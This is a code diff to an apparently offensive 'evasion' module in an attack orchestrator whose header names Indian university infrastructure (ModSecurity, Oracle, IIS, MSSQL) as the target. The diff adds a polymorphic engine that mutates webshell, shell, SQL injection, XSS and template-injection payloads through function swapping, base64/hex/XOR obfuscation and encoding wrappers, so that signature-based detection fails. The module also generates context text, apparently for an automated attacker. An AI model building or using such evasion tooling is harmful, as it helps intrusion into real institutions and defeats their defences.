@@ -7,7 +7,10 @@ against Indian university infrastructure with ModSecurity/Oracle/IIS/MSSQL.
 import random
 import logging
 
+from orchestrator.evasion.polymorphic_engine import PolymorphicEngine
+
 logger = logging.getLogger("evasion")
+_poly_engine = PolymorphicEngine()
 
 WAF_BYPASS_TECHNIQUES = {
     "oracle_xmltype": {
@@ -337,3 +340,30 @@ def build_evasion_context(category: str, platform: str = None) -> str:
         parts.append(f"  Trace left: {details['trace']}")
 
     return "\n".join(parts)
+
+
+def build_polymorphic_context(payload_type: str = "auto") -> str:
+    types_desc = {
+        "php": "PHP code (webshells, eval, system, file operations)",
+        "shell": "shell commands (bash, sh, cmd)",
+        "sqli": "SQL injection strings",
+        "xss": "cross-site scripting payloads",
+        "ssti": "server-side template injection expressions",
+        "generic": "generic text payloads",
+    }
+    desc = types_desc.get(payload_type, "unknown")
+    return (
+        f"[POLYMORPHIC ENGINE — {payload_type} ({desc})]\n"
+        f"  Each payload is automatically mutated before delivery:\n"
+        f"  - PHP: function swapping (system↔exec↔passthru), string obfuscation (hex/base64/XOR),\n"
+        f"    junk code injection, tag variation (<?php/<?=/<?), encoding wrappers (eval(base64_decode()))\n"
+        f"  - Shell: whitespace variation, quote style changes, chain operator swapping\n"
+        f"  - SQLi: case randomization, comment injection, URL encoding\n"
+        f"  - XSS: mixed case, HTML entity encoding\n"
+        f"  - SSTI: delimiter variation, expression obfuscation\n"
+        f"  Signature-based detection will not match known payload hashes."
+    )
+
+
+def apply_polymorphic_mutation(payload: str, payload_type: str = "auto") -> str:
+    return _poly_engine.mutate(payload, payload_type)
